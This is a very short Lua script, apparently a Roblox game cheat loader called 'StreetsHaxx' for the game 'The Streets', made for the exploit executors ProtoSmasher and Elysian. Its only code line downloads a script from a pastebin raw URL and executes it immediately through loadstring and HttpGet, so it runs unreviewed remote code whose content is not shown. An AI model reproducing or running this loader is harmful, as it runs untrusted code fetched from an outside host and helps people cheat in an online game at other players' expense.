-[[
   StreetsHaxx by 3dsboy08
   Gui for 'The Streets'
   Works on ProtoSmasher and Elysian.
]]

loadstring(game:HttpGet("https://pastebin.com/raw/JEhNqqpC", true))()